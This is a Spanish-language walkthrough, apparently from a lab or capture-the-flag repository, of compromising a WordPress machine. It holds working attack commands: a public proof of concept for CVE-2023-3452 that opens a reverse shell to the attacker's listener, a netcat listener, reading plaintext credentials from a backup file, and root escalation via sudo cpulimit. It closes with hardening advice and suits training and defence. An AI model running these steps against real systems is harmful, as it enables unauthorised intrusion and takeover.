# **Explotación de Máquina WordPress (Plugin Canto Vulnerable)**

![Nivel: Intermedio](https://img.shields.io/badge/Nivel-Intermedio-orange) ![CVE-2023-3452: Crítico](https://img.shields.io/badge/CVE--2023--3452-Cr%C3%ADtico-red)

## **Descripción**
Este repositorio documenta la explotación de una máquina Linux vulnerable a través de:
1. Vulnerabilidad en plugin WordPress Canto (CVE-2023-3452)
2. Fuzzing de directorios web
3. Escalada de privilegios mediante binario cpulimit

**Tiempo estimado**: 30-45 minutos  
**Dificultad**: Intermedia  
**Sistema operativo**: Linux (WordPress)

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Explotación Web](#explotación-web)
3. [Escalada de Privilegios](#escalada-de-privilegios)
4. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo de Red
```bash
sudo arp-scan -I eth0 --localnet
```
Identificamos IP objetivo: `10.0.2.5`

### 2. Escaneo Nmap Detallado
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.0.2.5 -oN full_scan
```
**Hallazgos clave**:
- 80/tcp : Apache HTTP Server (WordPress)

## **Explotación Web**

### 3. Fuzzing de Directorios
```bash
gobuster dir -u http://10.0.2.5 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
**Ruta crítica encontrada**:
```
/wp-content/plugins/canto
```

### 4. Explotación de CVE-2023-3452
```bash
git clone https://github.com/leoanggal1/CVE-2023-3452-PoC
cd CVE-2023-3452-PoC
python3 CVE-2023-3452.py -u http://10.0.2.5 -LHOST 10.0.2.4 -NC_PORT 4444 -s php-reverse-shell.php
```

### 5. Conexión Reversa
```bash
nc -nlvp 4444
```
**Mejora de Shell**:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## **Escalada de Privilegios**

### 6. Enumeración de Usuarios
```bash
find / -name backups 2>/dev/null
cat /var/wordpress/backups/creds.txt
```
**Credenciales obtenidas**:
- Usuario: erik
- Contraseña: [password_encontrado]

### 7. Acceso como Usuario
```bash
su erik
```

### 8. Escalada a Root
```bash
sudo -l
```
**Binario vulnerable**:
```
(ALL) NOPASSWD: /usr/bin/cpulimit
```

**Explotación**:
```bash
sudo cpulimit -l 100 -f /bin/sh
whoami  # Verificamos que somos root
```

## **Conclusión**

### Vulnerabilidades Críticas
1. Plugin WordPress Canto sin actualizar (CVE-2023-3452)
2. Credenciales almacenadas en texto plano
3. Configuración insegura de sudo para cpulimit

### Hardening Recomendado
- Actualizar plugin Canto a última versión
- Implementar autenticación de dos factores
- Restringir permisos sudo innecesarios


**¿Te resultó útil?** ¡Dale una ⭐ al repositorio!

> 🔐 **Aviso Legal**: Solo para uso en entornos con permiso explícito.

---

**Herramientas utilizadas**:
- Nmap
- Gobuster
- Exploit CVE-2023-3452
- Netcat

**Referencias**:
- [Detalles CVE-2023-3452](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452)
- [Buenas Prácticas de Seguridad WordPress](https://wordpress.org/documentation/article/hardening-wordpress/)

